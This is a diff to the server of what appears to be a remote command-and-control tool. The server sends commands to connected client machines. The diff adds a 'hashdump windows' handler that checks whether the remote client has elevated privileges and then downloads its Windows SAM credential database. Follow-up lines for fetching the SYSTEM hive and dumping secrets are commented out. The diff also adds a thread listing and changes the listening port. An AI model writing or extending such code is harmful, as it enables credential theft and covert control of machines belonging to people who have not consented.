@@ -3,12 +3,13 @@ import socket
 import ssl
 import threading
 import random
+import time
 
 import lib
 from command_controller import Client
 
 server_host = '0.0.0.0'
-server_port = 1234
+server_port = 12345
 max_number_of_connections = 5
 
 threads = {}
@@ -56,6 +57,24 @@ def handle_client(conn, addr, command_queue):
 
                         conn.send(command.encode('utf-8'))
 
+                        if command == "hashdump windows":
+                            # check if the client is running on elevated privileges
+                            check_right = conn.recv(1024).decode('utf-8')
+                            if check_right == "The client is not running with elevated privileges":
+                                print("The client is not running with elevated privileges")
+                                lib.print_mko_client(current_thread.ident)
+                                continue
+                            else:
+                                sam_path = lib.download_file("sam", conn)
+                                # sleep to avoid conflict
+                                time.sleep(1)
+                                #sys_path = lib.download_file("system", conn)
+
+                                print("sam_path: ", sam_path)
+                               # print("sys_path: ", sys_path)
+
+                                #lib.secret_dump_from_files(sam_path, sys_path)
+
                         if command.startswith("upload"):
                             file_path = command.split(" ")[1]
                             lib.upload_file(file_path, conn)
@@ -98,6 +117,14 @@ def handle_client(conn, addr, command_queue):
     else:
         if context_manager == current_thread.ident:
             context_manager = None
+            # remove current client from the list
+
+            #print all threads
+            print("ID   TID   \n--   ---  ")
+            for thread_id in threads:
+                print(f"{thread_id}   {threads[thread_id]}")
+            print("\n")
+
             lib.print_mko_prefix()
         else:
             lib.print_mko_client(context_manager)
